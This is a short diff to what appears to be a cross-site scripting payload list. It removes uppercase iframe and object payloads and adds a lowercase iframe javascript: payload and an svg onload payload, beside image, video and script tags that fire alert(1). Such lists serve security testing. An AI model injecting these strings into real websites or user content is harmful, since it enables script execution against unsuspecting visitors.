@@ -2,5 +2,5 @@
 <image src/onerror=alert(1)>
 <video src/onerror=alert(1)>
 <script>alert(1)</script
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<iframe src="javascript:alert('XSS');"></iframe>
+<svg onload=alert(1)>
